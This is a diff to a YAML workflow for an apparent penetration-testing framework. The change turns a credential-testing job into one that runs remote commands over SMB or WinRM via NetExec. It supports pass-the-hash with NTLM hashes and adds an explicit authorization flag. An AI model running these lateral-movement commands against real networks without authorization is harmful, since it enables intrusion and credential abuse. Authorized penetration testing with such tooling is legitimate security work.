@@ -1,6 +1,7 @@
 name: lateral-movement
-description: Lateral movement — test discovered credentials across internal hosts
-  using SMB, WinRM, SSH, and RDP.
+description: Lateral movement — execute commands on internal hosts over SMB or WinRM
+  using a password or NTLM hash. Select the protocol explicitly; requires explicit
+  authorization (approved input).
 tags:
 - post
 - lateral
@@ -13,20 +14,28 @@ dispatch:
     target:
       required: true
       type: string
-      description: Target network or host file (CIDR or IP list)
+      description: Target host or host file (CIDR or IP list)
       alias: t
     username:
       required: true
       type: string
-      description: Username to test
+      description: Username to authenticate with
     password:
       type: string
       default: ''
-      description: Password
+      description: Password (used when 'hash' is empty)
     hash:
       type: string
       default: ''
-      description: NTLM hash for pass-the-hash
+      description: NTLM hash for pass-the-hash (takes precedence over 'password')
+    protocol:
+      required: true
+      type: string
+      description: 'Protocol to use: smb or winrm (exactly one is executed)'
+    approved:
+      required: true
+      type: boolean
+      description: Explicit authorization for this action (required)
     log_command:
       type: string
       default: 'true'
@@ -34,18 +43,32 @@ dispatch:
 jobs:
   smb-move:
     name: SMB Lateral Movement
+    run_if: '{{ inputs.approved and inputs.protocol == ''smb'' }}'
     steps:
     - name: nxc-smb
-      run: nxc smb {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
-        }}" --shares --exec-method smbexec -x "whoami && ipconfig" 2>&1 | tee {{ env.OFX_RUN_DIR
-        }}/nxc_smb_lateral.txt
-      continue-on-error: true
+      module: local.builtin.shell
+      with:
+        cmd: set -o pipefail; nxc smb {{ inputs.target }} -u {{ inputs.username }}
+          {% if inputs.hash %}-H {{ inputs.hash }}{% else %}-p "{{ inputs.password }}"{%
+          endif %} --shares --exec-method smbexec -x "whoami && ipconfig" 2>&1 | tee
+          {{ env.OFX_RUN_DIR }}/nxc_smb_lateral.txt
+      retry: 2
+      retry-delay: 10
+      continue-on-error: false
       log-command: '{{ inputs.log_command }}'
+      timeout: 120
   winrm-move:
     name: WinRM Lateral Movement
+    run_if: '{{ inputs.approved and inputs.protocol == ''winrm'' }}'
     steps:
     - name: nxc-winrm
-      run: nxc winrm {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
-        }}" -x "whoami" 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_winrm_lateral.txt
-      continue-on-error: true
+      module: local.builtin.shell
+      with:
+        cmd: set -o pipefail; nxc winrm {{ inputs.target }} -u {{ inputs.username }}
+          {% if inputs.hash %}-H {{ inputs.hash }}{% else %}-p "{{ inputs.password }}"{%
+          endif %} -x "whoami" 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_winrm_lateral.txt
+      retry: 2
+      retry-delay: 10
+      continue-on-error: false
       log-command: '{{ inputs.log_command }}'
+      timeout: 120
